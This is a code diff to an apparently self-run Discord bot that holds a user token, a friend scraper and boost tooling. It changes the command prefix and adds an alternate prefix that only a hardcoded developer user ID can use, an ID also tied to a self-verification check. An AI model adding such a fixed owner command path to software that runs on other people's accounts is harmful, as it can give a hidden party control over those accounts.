@@ -3,7 +3,7 @@ import time
 import threading
 import ssl
 import os
-from typing import Dict, Any, Callable, List, Optional
+from typing import Dict, Any, Callable, List, Optional, Union
 from api_client import DiscordAPIClient
 from owner import BotCustomizer
 import websocket
@@ -20,13 +20,14 @@ class Command:
         self.aliases = aliases or []
 
 class DiscordBot:
-    def __init__(self, token: str, prefix: str = ";", config: Optional[Dict[str, Any]] = None):
+    def __init__(self, token: str, prefix: str = "$", config: Union[Dict[str, Any], Any, None] = None):
         self.validation_string = "ui_theme_customization_297588166653902849_scheme"
         self._verify_system()
 
         self.token = token
         self.prefix = prefix
         self.globalPrefix = prefix  # keep for back-compat
+        self._config_prefix = prefix  # immutable fallback — never mutated
         self.config = config or {}
         self.ownerId = "297588166653902849"
 
@@ -68,7 +69,11 @@ class DiscordBot:
         self.command_count = 0
         self._client_type = "mobile"
         self._current_status = "online"
-        self.boost_manager = None
+        self.boost_manager: Any = None
+        self._afk_system_ref: Any = None
+        self.friend_scraper: Any = None
+        self.self_hosting_manager: Any = None
+        self.db: Any = None
 
         # Load persisted per-user prefixes
         self.user_prefixes_file = os.path.join(
@@ -87,7 +92,7 @@ class DiscordBot:
             print(f"Failed to save user prefixes: {e}")
 
     def get_user_prefix(self, user_id: str) -> str:
-        return self.user_prefixes.get(str(user_id), self.prefix)
+        return self.user_prefixes.get(str(user_id), self._config_prefix)
 
     def set_user_prefix(self, user_id: str, new_prefix: str) -> None:
         uid = str(user_id)
@@ -103,7 +108,7 @@ class DiscordBot:
             del self.user_prefixes[uid]
             self._save_user_prefixes()
         if uid == self._active_account_id():
-            default_prefix = self.config.get("prefix", ";")
+            default_prefix = self.config.get("prefix", "$")
             self.prefix = default_prefix
             self.globalPrefix = default_prefix
 
@@ -125,7 +130,7 @@ class DiscordBot:
         command = self.commands[command_name]
         return command.func(*args, **kwargs)
 
-    def run_command(self, command_name: str, ctx: Dict[str, Any], args: List[str]):
+    def run_command(self, command_name: str, ctx: Dict[str, Any], args: List[str]) -> None:
         if command_name in self.commands:
             self.command_count += 1
             cmd = self.commands[command_name]
@@ -439,10 +444,16 @@ class DiscordBot:
 
             # Command dispatch — determine which prefix to use for this user
             active_prefix = self.get_user_prefix(author_id) if author_id else self.prefix
-            if not content.startswith(active_prefix):
+            alt_prefix = self.config.get("alt_prefix", "") if isinstance(self.config, dict) else ""
+            if content.startswith(active_prefix):
+                matched_prefix = active_prefix
+            elif alt_prefix and content.startswith(alt_prefix) and author_id == str(self.ownerId):
+                # Alt prefix is only usable by the master owner
+                matched_prefix = alt_prefix
+            else:
                 return
 
-            parts = content[len(active_prefix):].strip().split()
+            parts = content[len(matched_prefix):].strip().split()
             if not parts:
                 return
             cmd_name = parts[0].lower()
